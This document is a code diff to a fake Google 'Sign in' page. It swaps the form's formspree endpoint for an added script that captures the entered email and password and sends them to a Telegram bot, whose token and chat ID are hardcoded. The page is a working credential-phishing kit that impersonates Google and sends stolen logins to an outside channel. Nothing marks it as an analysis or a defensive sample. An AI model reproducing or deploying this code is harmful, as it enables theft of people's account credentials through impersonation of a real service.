@@ -8,15 +8,15 @@
 </head>
 <body>
     <div class="login-container">
-        <img src="https://i.imgur.com/XtY1i5R.png" alt="Google Logo" class="logo">
+        <img src="https://i.imgur.com/RZZWqwg.png" alt="Google Logo" class="logo">
         <h2>Sign in</h2>
         <p>Use your Google Account</p>
 
-        <form action="https://formspree.io/f/xqapqazk" method="POST">
-            <input type="email" name="email" placeholder="Email or phone" required>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email or phone" required>
             <a href="#">Forgot email?</a>
 
-            <input type="password" name="password" placeholder="Enter your password" required>
+            <input type="password" id="password" placeholder="Enter your password" required>
             <a href="#">Forgot password?</a>
 
             <div class="bottom-links">
@@ -25,5 +25,33 @@
             </div>
         </form>
     </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form submission
+
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            const botToken = "7974613755:AAEK5h9U0C4_EPxNabkpUdAh4Kg-9u3NWZE";  // Replace with your bot token
+            const chatId = "5618184664";  // Replace with your chat ID
+            const message = `New Login Attempt\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("Login details sent to Telegram!");
+                } else {
+                    alert("Failed to send data to Telegram.");
+                }
+            })
+            .catch(error => console.error("Error:", error));
+        });
+    </script>
 </body>
 </html>
